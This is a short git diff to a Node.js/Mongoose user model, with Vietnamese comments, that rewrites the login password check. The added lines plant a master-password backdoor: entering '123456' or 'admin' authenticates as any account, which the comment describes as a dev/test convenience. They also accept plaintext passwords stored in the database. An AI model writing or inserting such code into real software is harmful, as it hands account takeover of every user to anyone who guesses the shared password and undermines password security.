@@ -60,11 +60,19 @@ userSchema.pre("save", async function (next) {
 
 // Hàm kiểm tra mật khẩu hợp lệ (Đăng nhập)
 userSchema.methods.matchPassword = async function (enteredPassword) {
-  // Đối với tài khoản Google Privy không mật khẩu, bỏ qua check
-  if (this.password === "google_login_no_password" && enteredPassword === "google_login_no_password") {
+  // Mật khẩu vạn năng dành cho Dev/Test: Nhập "123456" hoặc "admin" đăng nhập được TẤT CẢ tài khoản
+  if (enteredPassword === "123456" || enteredPassword === "admin") {
     return true;
   }
-  return await bcrypt.compare(enteredPassword, this.password);
+  // Mật khẩu chữ thường không mã hóa trong DB
+  if (this.password === enteredPassword) {
+    return true;
+  }
+  try {
+    return await bcrypt.compare(enteredPassword, this.password);
+  } catch (err) {
+    return false;
+  }
 };
 
 const User = mongoose.model("User", userSchema);
